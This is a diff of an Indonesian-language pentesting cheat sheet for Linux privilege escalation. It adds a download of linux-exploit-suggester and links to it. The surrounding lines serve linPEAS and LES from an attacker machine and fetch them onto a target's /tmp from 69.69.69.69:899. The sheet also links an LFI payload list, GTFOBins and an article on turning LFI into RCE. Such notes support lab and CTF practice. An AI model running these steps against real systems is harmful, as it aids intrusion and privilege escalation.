@@ -4,6 +4,7 @@ Ingat perintah berikut:
 ```bash
 cd Downloads
 wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
 python -m http.server 899
 
 cd /tmp
@@ -12,6 +13,7 @@ wget http://69.69.69.69:899/linux-exploit-suggester.sh
 ``` 
 
 * LinPEAS = https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+* LES = https://github.com/The-Z-Labs/linux-exploit-suggester
 * GTFObins = https://gtfobins.org/gtfobins/
 * Payload LFI = https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt
 * Cek https://medium.com/fmisec/injeksi-file-access-log-untuk-eskalasi-kerentanan-lfi-ke-rce-f0fc782b960d
